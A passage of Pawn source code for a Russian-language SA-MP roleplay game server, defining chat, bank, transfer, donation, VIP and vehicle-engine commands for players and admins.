	if(PlayerInfo[playerid][pMuted] > 0)
	{
		format(YCMDstr, sizeof(YCMDstr), " У вас бан чата!");
		SCM(playerid, TEAM_CYAN_COLOR, YCMDstr);
		return true;
	}
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid, -1, " Введите: (/o)oc [текст]");
	if((!noooc) && PlayerInfo[playerid][pAdmin] < 1) return SCM(playerid, COLOR_GRAD1, " Общий чат отключен админом!");
	else if(dostup[playerid] == 0 && PlayerInfo[playerid][pAdmin] >= 1) return true;
	if(PlayerInfo[playerid][pAdmin] == 0 && gettime() < antioocsend) return SCM(playerid, COLOR_GREY, " Антифлуд ooc чата");
	antioocsend = gettime()+antiooc;
	foreach(i)
	{
		if(ChatOOC[playerid] == 1) SendMes(i,COLOR_OOC," << %s[%i]: %s >>",PlayerInfo[playerid][pName], playerid, params[0]);
	}
	return 1;
}
CMD:olimit(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",antiooc)) return SCM(playerid, -1, " Введите: /olimit [секунд 0 - 10]");
	if(antiooc > 10 || antiooc < 0) return SCM(playerid, COLOR_GREY, " Не меньше 0 и не больше 10 сек");
//	if(antiooc < 0) return SCM(playerid, COLOR_GREY, " Не меньше 0 сек");
	SendMes(playerid,-1," Установлен лимит ooc чата %i секунд",antiooc);
	return 1;
}
CMD:noooc(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
    noooc ^= 1;
	if(!noooc) SendClientMessageToAll(-1, " Общий чат отключён админом!");
	else SendClientMessageToAll(-1, " Общий чат включен админом!");
	return 1;
}
CMD:goverment(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	if(IsACop(playerid) || IsAArm(playerid) || IsAMayor(playerid) || IsAMedic(playerid) || IsALicenser(playerid))
	if(!GetPVarInt(playerid,"Fraction_Duty")) return SCM(playerid, COLOR_GREY, " Вам недоступен этот чат!");
	{
		new rtext[30];
		if(PlayerInfo[playerid][pMuted] > 0)
		{
			format(YCMDstr, sizeof(YCMDstr), " У вас бан чата!");
			SCM(playerid, TEAM_CYAN_COLOR, YCMDstr);
			return true;
		}
		if(sscanf(params, "s[128]", params[0])) return	SCM(playerid, -1, " Введите: (/gov)erment [текст]");
		if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1)
		{
			if(PlayerInfo[playerid][pRank] < 13) return true;
			if(PlayerInfo[playerid][pRank] == 13) { rtext = "Новости:"; }
			else if(PlayerInfo[playerid][pRank] == 14) { rtext = "Новости:"; }
		}
		else if(PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2)
		{
			if(PlayerInfo[playerid][pRank] < 9) return true;
			if(PlayerInfo[playerid][pRank] == 9) { rtext = "Новости:"; }
			else if(PlayerInfo[playerid][pRank] == 10) { rtext = "Новости:"; }
		}
		else if(PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)
		{
			if(PlayerInfo[playerid][pRank] < 14) return true;
			if(PlayerInfo[playerid][pRank] == 14) { rtext = "Новости:"; }
			else if(PlayerInfo[playerid][pRank] == 15) { rtext = "Новости:"; }
		}
		else if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4)
		{
			if(PlayerInfo[playerid][pRank] < 9) return true;
			if(PlayerInfo[playerid][pRank] == 10) { rtext = "Новости:"; }
			else if(PlayerInfo[playerid][pRank] == 9) { rtext = "Новости:"; }
			else { SCM(playerid,COLOR_GREY," Вам недоступна данная команда"); }
		}
		else if(PlayerInfo[playerid][pMember] == 7 || PlayerInfo[playerid][pLeader] == 7)
		{
			if(PlayerInfo[playerid][pRank] < 5) return true;
			if(PlayerInfo[playerid][pRank] == 5) { rtext = "Новости:"; }
			else if(PlayerInfo[playerid][pRank] == 6) { rtext = "Новости:"; }
		}
		else if(PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pLeader] == 10)
		{
			if(PlayerInfo[playerid][pRank] < 13) return true;
			if(PlayerInfo[playerid][pRank] == 13) { rtext = "Новости:"; }
			else if(PlayerInfo[playerid][pRank] == 14) { rtext = "Новости:"; }
		}
		else if(PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11)
		{
			if(PlayerInfo[playerid][pRank] < 9) return true;
			if(PlayerInfo[playerid][pRank] == 9) { rtext = "Новости:"; }
			else if(PlayerInfo[playerid][pRank] == 10) { rtext = "Новости:"; }
		}
		else if(PlayerInfo[playerid][pMember] == 19 || PlayerInfo[playerid][pLeader] == 19)
		{
			if(PlayerInfo[playerid][pRank] < 14) return true;
			if(PlayerInfo[playerid][pRank] == 14) { rtext = "Новости:"; }
			else if(PlayerInfo[playerid][pRank] == 15) { rtext = "Новости:"; }
		}
		else if(PlayerInfo[playerid][pMember] == 21 || PlayerInfo[playerid][pLeader] == 21)
		{
			if(PlayerInfo[playerid][pRank] < 13) return true;
			if(PlayerInfo[playerid][pRank] == 13) { rtext = "Новости:"; }
			else if(PlayerInfo[playerid][pRank] == 14) { rtext = "Новости:"; }
		}
		else if(PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pLeader] == 7)
		{
			if(PlayerInfo[playerid][pRank] < 9) return true;
			if(PlayerInfo[playerid][pRank] == 10) { rtext = "Новости:"; }
			else if(PlayerInfo[playerid][pRank] == 9) { rtext = "Новости:"; }
		}
		else if(PlayerInfo[playerid][pMember] == 33 || PlayerInfo[playerid][pLeader] == 7)
		{
			if(PlayerInfo[playerid][pRank] < 9) return true;
			if(PlayerInfo[playerid][pRank] == 10) { rtext = "Новости:"; }
			else if(PlayerInfo[playerid][pRank] == 9) { rtext = "Новости:"; }
		}
		else { return true; }
		SendClientMessageToAll(-1, "-----------=== Государственные Новости ===-----------");
		format(YCMDstr, sizeof(YCMDstr), " %s %s: %s", rtext, PlayerInfo[playerid][pName], params[0]);
		SendClientMessageToAll(0x2641feaa, YCMDstr);
	}
	return true;
}
CMD:fstyle(playerid, params[])
{
	if(sscanf(params, "d", params[0])) return SCM(playerid,-1, " Введите: /fstyle [стиль 0, 1, 2, 3]");
	if(params[0] < 0 || params[0] > 3) return SCM(playerid,COLOR_GREY, " Стиль 0, 1, 2, 3");
	if(params[0] == 0)
	{
		SetPlayerFightingStyle (playerid, FIGHT_STYLE_GRABKICK);
		SCM(playerid, 0xff00ff, " Установлен новый стиль боя");
	}
	else if(params[0] == 1)
	{
		if(PlayerInfo[playerid][pBoxSkill] >= 5500) SetPlayerFightingStyle (playerid, FIGHT_STYLE_BOXING), SCM(playerid, 0xff00ff, " Установлен новый стиль боя");
		else return SCM(playerid,COLOR_GREY," Этот стиль боя, вам пока недоступен");
	}
	else if(params[0] == 2)
	{
		if(PlayerInfo[playerid][pKongfuSkill] >= 5500) SetPlayerFightingStyle (playerid, FIGHT_STYLE_KUNGFU), SCM(playerid, 0xff00ff, " Установлен новый стиль боя");
		else return SCM(playerid,COLOR_GREY," Этот стиль боя, вам пока недоступен");
	}
	else if(params[0] == 3)
	{
		if(PlayerInfo[playerid][pKickboxSkill] >= 5500) SetPlayerFightingStyle (playerid, FIGHT_STYLE_KNEEHEAD), SCM(playerid, 0xff00ff, " Установлен новый стиль боя");
		else return SCM(playerid,COLOR_GREY," Этот стиль боя, вам пока недоступен");
	}
	return true;
}
CMD:balance(playerid, params[])
{
	if(!IsABank(playerid)) return SCM(playerid,COLOR_GREY," Нужно находиться в банке");
	format(YCMDstr, sizeof(YCMDstr), " Баланс: %i вирт", PlayerInfo[playerid][pBank]);
	SCM(playerid, 0x6495edff, YCMDstr);
	return true;
}
CMD:donate(playerid)
{
    if(!PlayerInfo[playerid][pLogin]) return true;
	format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
	{FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
	{FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
	{FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
	{FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
	{FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
	{FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
	{FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
	{FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
	{FFFFFF}[8] Приобрестти ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
	{FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
	{FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
	{FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
	{FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
	{FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
	PlayerInfo[playerid][pName],
	PlayerInfo[playerid][pDonateMoney],
	PlayerInfo[playerid][pDonateAccount]);
	ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
	return true;
}
CMD:givedonate(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 10 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ii", params[0], params[1])) return SCM(playerid, -1, " Введите: /givedonate [id игрока] [кол.коинов (0-100000 {F3FF02}GOLD {FFFFFF}Coins)]");
	if(params[1] < 1 || params[1] > 100000) return 1;
	PlayerInfo[params[0]][pDonateMoney] += params[1];
	format(string, 150, "{FFFFFF}Вы выдали игроку %s[%d] донат в размере: %i {F3FF02}GOLD {FFFFFF}COINS", PlayerInfo[params[0]][pName], params[0], params[1]);
	SCM(playerid, -1, string);
	format(string, 150, "{FFFFFF}Администратор выдал вам донат в размере: %i {F3FF02}GOLD {FFFFFF}COINS", params[1]);
	SCM(params[0], -1, string);
	mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pDonateMoney = '%i' WHERE name = '%e'", PlayerInfo[params[0]][pDonateMoney], PlayerInfo[params[0]][pName]);
    mysql_function_query(DATABASE,QUERY,false,"","");
	return 1;
}
CMD:bizbank(playerid, params[])
{
	if(!BGet(playerid))  return SCM(playerid, COLOR_GRAD2, "У вас нет бизнеса!");
	new bouse = PlayerInfo[playerid][pPBizzKey];
	if(sscanf(params, "dd", params[0],params[1])) return SCM(playerid, -1, " Введите: /bizbank [сумма] [1 - баланс банка | 2 - баланс оплаты электроэнергии]");
	if(params[0] < 1 || params[0] > (BizzLandTax[bouse]*720)-BizzInfo[bouse][bLandTax] && params[1] == 2)  return SendMes(playerid, COLOR_GRAD2, "Неверная сумма, максимально допустимая %i вирт", (BizzLandTax[bouse]*720)-BizzInfo[bouse][bLandTax]);
	if(!IsABank(playerid)) return SCM(playerid,COLOR_GREY," Вы не в банке");
	if(PlayerInfo[playerid][pBank] < params[0]) return SCM(playerid, COLOR_GREY, " На банковском счету недостаточно средств");
	PlayerInfo[playerid][pBank] -= params[0];
	switch(params[1])
	{
	case 1: BizzInfo[bouse][bTill] += params[0], SendMes(playerid,0x6495EDFF," Вы перевели на счёт вашего бизнеса %i вирт",params[0]);
	case 2: BizzInfo[bouse][bLandTax] += params[0],SendMes(playerid,0x6495EDFF," Вы перевели на счёт вашего бизнеса %i вирт",params[0]);
	default: SCM(playerid,COLOR_GREY," Неверное значение!");
	}
	return true;
}
CMD:housebank(playerid, params[])
{
	if(!HGet(playerid))  return SCM(playerid, COLOR_GRAD2, "У вас нет дома!");
	new bouse = PlayerInfo[playerid][pPHouseKey];
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /housebank [сумма]");
	new cc = 36150-HouseInfo[bouse][hTakings];
	if(params[0] < 1 || HouseInfo[bouse][hTakings]+params[0] > GetHouseOplata(PlayerInfo[playerid][pPHouseKey]))  return SendMes(playerid, COLOR_GRAD2, " Неверная сумма, максимально допустимая %i вирт",cc);
	if(!IsABank(playerid)) return SCM(playerid,COLOR_GREY," Вы не в банке");
	if(PlayerInfo[playerid][pBank] < params[0]) return SCM(playerid, COLOR_GREY, " На банковском счету недостаточно средств");
	PlayerInfo[playerid][pBank] -= params[0];
	HouseInfo[bouse][hTakings]+= params[0], SendMes(playerid,0x6495EDFF," Вы перевели на счёт вашего дома %i вирт",params[0]);
	return true;
}
CMD:houseo(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /houseo [номер дома]");
	SetPlayerPos(playerid,HouseInfo[params[0]][hExitx],HouseInfo[params[0]][hExity],HouseInfo[params[0]][hExitz]);
	SetPlayerInterior(playerid,HouseInfo[params[0]][hInt]);
	SetPlayerVirtualWorld(playerid,params[0]+50);
	return true;
}
CMD:bank(playerid, params[])
{
	if(!IsABank(playerid)) return SCM(playerid,COLOR_GREY," Нужно находиться в банке");
	if(sscanf(params, "d", params[0]))
	{
		SCM(playerid, -1, " Введите: /bank [сумма]");
		return true;
	}
	if(PlayerInfo[playerid][pCash] < params[0]) { SCM(playerid, COLOR_GREY, " У вас нет столько денег!"); return true; }
//	if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильное количество денег!"); return true; }
	PlayerInfo[playerid][pCash] -= params[0];
	PlayerInfo[playerid][pBank] += params[0];
	format(YCMDstr, sizeof(YCMDstr), " Вы пополнили счет на %i вирт. Баланс: %i вирт", params[0], PlayerInfo[playerid][pBank]);
	SCM(playerid, 0x6495edff, YCMDstr);
	return true;
}
CMD:whonear(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(sscanf(params, "fdd", params[0], params[1], params[2]) || params[2] > 1 || params[2] < 0) return SCM(playerid, -1, " Введите: /whonear [радиус в метрах] [лвл] [0 - равно и меньше, 1 - равно и больше]");
	new Float: POS[3], playername[MAX_PLAYER_NAME];
	GetPlayerPos(playerid, POS[0], POS[1], POS[2]);
	for(new i; i<MAX_PLAYERS; i++)
	{
		if(!IsPlayerConnected(i) || !IsPlayerInRangeOfPoint(playerid, params[0], POS[0], POS[1], POS[2])) continue;
		if(params[2] == 0 && PlayerInfo[i][pLevel] > params[1]) continue;
		if(params[2] == 1 && PlayerInfo[i][pLevel] < params[1]) continue;
		GetPlayerName(i, playername, MAX_PLAYER_NAME);
		format(string, 60, " %s [ID: %i]", playername, i);
		SCM(playerid, -1, string);
	}
	return 1;
}
CMD:transfer(playerid, params[])
{
	if(PlayerInfo[playerid][pLevel] < 3) return SCM(playerid, COLOR_GREY, " Вы должны быть 3 уровня!");
	if(!IsABank(playerid)) return SCM(playerid, COLOR_GREY, " Нужно находиться в банке");
//	if(PlayerInfo[playerid][pPayDayHad] < 5) return SCM(playerid, COLOR_GRAD1, "Вы должны отыграть 5 часов!");
	new year1, month1, day1, hour1, minute1, second1;
	getdate(year1, month1, day1);
	gettime(hour1, minute1, second1);
	if(sscanf(params, "ud", params[0],params[1])) return SCM(playerid, -1, " Введите: /transfer [ник игрока] [сумма]");
	if (!IsPlayerConnected(params[0])) return true;
	if(params[1] > 0 && PlayerInfo[playerid][pBank] >= params[1])
	{
		PlayerInfo[playerid][pBank] -= params[1];
		PlayerInfo[params[0]][pBank] += params[1];
		format(YCMDstr, sizeof(YCMDstr), " Вы передали %i вирт, на счет %s [%i/%i/%i  %i:%i]", params[1], Name(params[0]), day1,month1,year1,hour1, minute1);
		SCM(playerid, COLOR_BLUE, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " Вы получили %i вирт, на свой счет от %s [%i/%i/%i  %i:%i]",params[1],Name(playerid), day1,month1,year1,hour1, minute1);
		SCM(params[0], COLOR_BLUE, YCMDstr);
		PlayerPlaySound(params[0], 1052, 0.0, 0.0, 0.0);
	}
	printf("[TRANSFER] %s перевёл %s %i вирт", PlayerInfo[playerid][pName], PlayerInfo[params[0]][pName], params[1]);
	return true;
}
CMD:withdraw(playerid, params[])
{
	if(!IsABank(playerid)) return SCM(playerid, COLOR_GREY, " Нужно находиться в банке");
	if(sscanf(params, "d", params[0]))
	{
		SCM(playerid, -1, " Введите: /withdraw [сумма]");
		return true;
	}
//	if(params[0] < 1 || params[0] > 100000000) { SCM(playerid, COLOR_GREY, " Нельзя снять 1 вирта и более 100000000!"); return true; }
	if(PlayerInfo[playerid][pBank] < params[0]) return SCM(playerid, COLOR_GRAD1, " У вас нет столько денег!");
	PlayerInfo[playerid][pCash] += params[0];
	PlayerInfo[playerid][pBank] -= params[0];
	format(YCMDstr, sizeof(YCMDstr), " Вы сняли со счета %i вирт. Баланс: %i вирт",params[0], PlayerInfo[playerid][pBank]);
	SCM(playerid, 0x6495edff, YCMDstr);
	return true;
}
CMD:gethousemoney(playerid, params[])
{
	if(!IsABank(playerid)) return SCM(playerid, COLOR_GREY, " Вы не в банке!");
	if(PlayerInfo[playerid][pHousecash] <=0) return	SCM(playerid, COLOR_GRAD1, " Вас не выселяли"), PlayerInfo[playerid][pText] = 0;
	PlayerInfo[playerid][pCash] += PlayerInfo[playerid][pHousecash];
	format(YCMDstr, sizeof(YCMDstr), " Деньги переведены на ваш банковский счет", PlayerInfo[playerid][pHousecash]);
	SCM(playerid, COLOR_LIGHTGREEN, YCMDstr);
	PlayerInfo[playerid][pHousecash] = 0;
	PlayerInfo[playerid][pText] = 0;
	return true;
}
CMD:en(playerid, params[])
{
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 481 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 509 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 510) return SCM(playerid,-1,"Iaaiionoeiue o?ainii?o");
	if(GetPlayerVehicleID(playerid) == INVALID_VEHICLE_ID) return true;
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return true;
	new vehicleid = GetPlayerVehicleID(playerid);
	GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
	if(!engine)
	{
		if(Fuell[vehicleid] <= 0 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 462)
		{
			Fuell[vehicleid] = 0;
			GameTextForPlayer(playerid,"~r~FUEL HAS ENDED", 5000, 3);
			SCM(playerid, COLOR_RED, " Двигатель не заводится");
			SCM(playerid, COLOR_GREEN, " {00A86B}Используйте телефон {FFFFFF}(( /call )) {00A86B}чтобы вызвать механика / таксиста");
			SCM(playerid, COLOR_GREEN, " {00A86B}Если у вас есть канистра с бензином, введите {FFFFFF}(( /fillcar ))");
			return true;
		}
		if(CarHealth[GetPlayerVehicleID(playerid)] < 300) return GameTextForPlayer(playerid,"~r~ENGINE HAS BROKENED", 5000, 3);
		GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(GetPlayerVehicleID(playerid),true,true,alarm,doors,bonnet,boot,objective);
	}
	else
	{
		SetPVarInt(playerid,"not_engine",0);
		SetPVarInt(playerid,"not_engine_",0);
		GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(GetPlayerVehicleID(playerid),false,false,alarm,doors,bonnet,boot,objective);
	}
	return true;
}
CMD:hi(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(IsPlayerInAnyVehicle(playerid)) return SCM(playerid, COLOR_GREY, " Нельзя использовать в машине");
	if(sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: /hi [ид]");
	if(!IsPlayerConnected(params[0])) return true;
	if(!ProxDetectorS(2.0, playerid, params[0]) || IsPlayerInAnyVehicle(params[0])) return SCM(playerid, COLOR_GREY, " Игрок далеко от вас");
	if(params[0] == playerid)  return  SCM(playerid,COLOR_GRAD1, " [Ошибка] Вы указали свой ID");
	new Float:angle;
	GetPlayerFacingAngle(playerid, angle);
	SetPlayerFacingAngle(params[0], angle + 180);
	format(YCMDstr, sizeof(YCMDstr), " %s пожал руку %s'у",Name(playerid),Name(params[0]));
	ProxDetector(10.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	ApplyAnimation(playerid, "GANGS", "hndshkfa",4.0,0,0,0,0,0,1);
	ApplyAnimation(params[0], "GANGS", "hndshkfa",4.0,0,0,0,0,0,1);
	return true;
}
CMD:viphelp(playerid)
{
	ShowPlayerDialogEx(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Помощь {AE443D}VIP", "\t\tBRONZE VIP - {FFFFFF}срок действия: навсегда\n\n\
	Команды привилегированных:\n\
    \t- {AE443D}/togphone - {FFFFFF}возможность выключить мобильный телефон\n\
    Экономические привелегии:\n\
    \t- При покупке {AE443D}500.000$ {FFFFFF}на банковский счёт\n\
    \t- Возможность оплачивать домашний счёт на {AE443D}32 {FFFFFF}дня\n\
	Привелегии развития персонажа:\n\
    \t- Срок наказания ( бан; варн ) снижается на {AE443D}15 {FFFFFF}процентов\n\
    \t- Навыки владения оружием прокачиваются в {AE443D}2 {FFFFFF}раза быстрее\n\
	\t- Каждый PayDay уровень розыска пропадает в {AE443D}2 {FFFFFF}раза быстрее\n\n\
	\t\tSILVER VIP - {FFFFFF}срок действия: навсегда\n\n\
	Команды привилегированных:\n\
	\t- {AE443D}/togphone - {FFFFFF}возможность выключить мобильный телефон\n\
	\t- {AE443D}/admins - {FFFFFF}возможность посмотреть список администрации в сети\n\
	Экономические привилегии:\n\
	\t- При покупке {AE443D}1.000.000$ {FFFFFF}на банковский счёт\n\
	\t- Возможность оплачивать домашний счёт на {AE443D}33 {FFFFFF}дня\n\
	\t- Персональная скидка {AE443D}20 {FFFFFF}процентов на все акссесуары в магазине << Thuze >>\n\
	Привилегии развития персонажа:\n\
    \t- Срок наказания ( бан; варн ) снижается на {AE443D}30 {FFFFFF}процентов\n\
    \t- Навыки владения оружием прокачиваются в {AE443D}2 {FFFFFF}раза быстрее\n\
	\t- Каждый PayDay уровень розыска пропадает в {AE443D}2 {FFFFFF}раза быстрее\n\
	\t- Навыки криминальных абот и гос.профессий прокачиваются в {AE443D}2 {FFFFFF}раза быстрее\n\n\
	\t\t{F3FF02}GOLD VIP - {FFFFFF}срок действия: {F3FF02}навсегда{FFFFFF}\n\n\
	{F3FF02}Команды привилегированных:\n\
	\t{F3FF02}- {AE443D}/togphone - {FFFFFF}возможность выключить мобильный телефон\n\
	\t{F3FF02}- {AE443D}/vipuninvite - {FFFFFF}возможность самостоятельно покинуть фракцию\n\
	\t{F3FF02}- {AE443D}/admins - {FFFFFF}возможность посмотреть список администрации в сети\n\
	{F3FF02}Экономические привилегии:\n\
	\t{F3FF02}- {FFFFFF}При покупке {AE443D}1.500.000$ {FFFFFF}на банковский счёт\n\
	\t{F3FF02}- {FFFFFF}Возможность оплачивать домашний счёт на {AE443D}37 {FFFFFF}дней\n\
	\t{F3FF02}- {FFFFFF}Персональная скидка {AE443D}30 {FFFFFF}процентов на все акссесуары в магазине << Thuze >>\n\
	\t{F3FF02}- {FFFFFF}Время онлайн для получения подарочного вращения снижается на {AE443D}39 {FFFFFF}минут\n\
	{F3FF02}Привилегии развития персонажа:\n\
	\t{F3FF02}- {FFFFFF}Каждый PayDay вам начисляется {AE443D}1 Gold Coins\n\
    \t{F3FF02}- {FFFFFF}Срок наказания ( бан; варн ) снижается на {AE443D}50 {FFFFFF}процентов\n\
    \t{F3FF02}- {FFFFFF}Каждый PayDay получаемый опыт увеличивается в {AE443D}2 {FFFFFF}раза\n\
    \t{F3FF02}- {FFFFFF}Каждый PayDay увеличивается репутация персонажа на {AE443D}0.2{FFFFFF}\n\
    \t{F3FF02}- {FFFFFF}Навыки владения оружием прокачиваются в {AE443D}2 {FFFFFF}раза быстрее\n\
	\t{F3FF02}- {FFFFFF}Каждый PayDay уровень розыска пропадает в {AE443D}2 {FFFFFF}раза быстрее\n\
	\t{F3FF02}- {FFFFFF}Уровень здоровья при голоде отнимается в {AE443D}2 {FFFFFF}раза медленее\n\
	\t{F3FF02}- {FFFFFF}Максимальное количество переносимых наркотиков расширено до {AE443D}220{FFFFFF}\n\
	\t{F3FF02}- {FFFFFF}Максимальное количество переносимых материалов расширено до {AE443D}1000{FFFFFF}\n\
	\t{F3FF02}- {FFFFFF}Навыки криминальных абот и гос.профессий прокачиваются в {AE443D}3 {FFFFFF}раза быстрее", "Закрыть", "");
	return true;
}
CMD:vipuninvite(playerid)
{
	if(PlayerInfo[playerid][pDonateRank] < 3) return SCM(playerid, COLOR_GREY, " Только для пользователей VIP GOLD");
	if(PlayerInfo[playerid][pLeader] >= 1) return SCM(playerid,COLOR_GREY," Вы не состоите во фракции");
	if(PlayerInfo[playerid][pMember] > 0)
	{
		if(GetPVarInt(playerid,"capture_on"))
		{
			DeletePVar(playerid,"capture_on");
			PlayerTextDrawHide(playerid, Capture[playerid]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(playerid,INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
		if(GetPVarInt(playerid,"mafia_war"))
		{
			DeletePVar(playerid,"mafia_war");
			PlayerTextDrawHide(playerid, Capture[playerid]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(playerid,INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
		if(GetPVarInt(playerid,"biker_capt"))
		{
			DeletePVar(playerid,"biker_capt");
			PlayerTextDrawHide(playerid, Capture[playerid]);
			DestroyDynamic3DTextLabel(BikerText[playerid]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(playerid,INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
		PlayerInfo[playerid][pMember] = 0;
		PlayerInfo[playerid][pRank] = 0;
		PlayerInfo[playerid][pLeader] = 0;
		PlayerInfo[playerid][pJob] = 0;
		SetPlayerArmourAC(playerid,0);
		SetPlayerColor(playerid, TEAM_HIT_COLOR);
		SetPlayerSkin(playerid, PlayerInfo[playerid][pChar][0]);
		SCM(playerid, COLOR_BLUE, " Рабочий день окончен");
		SCM(playerid, COLOR_BLUE, " Вы снова гражданский");
	}
	return true;
}
CMD:togphone(playerid)
{
	if(PlayerInfo[playerid][pDonateRank] >= 1 || PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pLeader] >= 1)
	{
		if(!PhoneOnline[playerid])
		{
			PhoneOnline[playerid] = 1;
			format(YCMDstr, sizeof(YCMDstr), " Ваш телефон выключен!",Name(playerid));
			SCM(playerid, -1, YCMDstr);
		}
		else if(PhoneOnline[playerid])
		{
			PhoneOnline[playerid] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Ваш телефон включен!",Name(playerid));
			SCM(playerid, -1, YCMDstr);
		}
	}
	else
	{
		SCM(playerid, COLOR_GREY, " Вы не админ / лидер организации / VIP игрок!");
		return true;
	}
	return true;
}
CMD:me(playerid, params[])
{
	if(Flood[playerid] > 0 && PlayerInfo[playerid][pAdmin] <= 6)
	{
 	 	SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
		if(GetPVarInt(playerid,"Flood") >= 4) kick(playerid);
		SCM(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
	AntiReklama(playerid,params[1],"me");
	if(GetPVarInt(playerid, "antireklamka") == 1)
	{
		SetPVarInt(playerid, "antireklamka", 0);
		return true;
	}
	if(gettime() < (GetPVarInt(playerid, "SendMe") + 30))
    {
		if(GetPVarInt(playerid, "SendMeTimes") >= 3)
		{
			return SCM(playerid, COLOR_GREY, " Эту команду можно использовать не более 3 раз в 30 секунд");
		}
    }
	else SetPVarInt(playerid, "SendMeTimes", 0);
	
	if(PlayerInfo[playerid][pMuted] > 0) return SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	if(sscanf(params, "s[64]", params[0])) return SCM(playerid, -1, " Введите: /me [действие]");
	format(YCMDstr, sizeof(YCMDstr), " %s %s", Name(playerid), params[0]);
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	SetPlayerChatBubble(playerid,params[0],COLOR_PURPLE,30.0,10000);
	Flood[playerid] = 1;
	SetPVarInt(playerid,"Flood",0);
	SetPVarInt(playerid, "SendMeTimes", GetPVarInt(playerid, "SendMeTimes")+1);
	SetPVarInt(playerid, "SendMe", gettime());
	return true;
}
CMD:do(playerid, params[])
{
	if(Flood[playerid] > 0 && PlayerInfo[playerid][pAdmin] <= 6)
	{
		SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
		if(GetPVarInt(playerid,"Flood") >= 4) kick(playerid);
		SCM(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
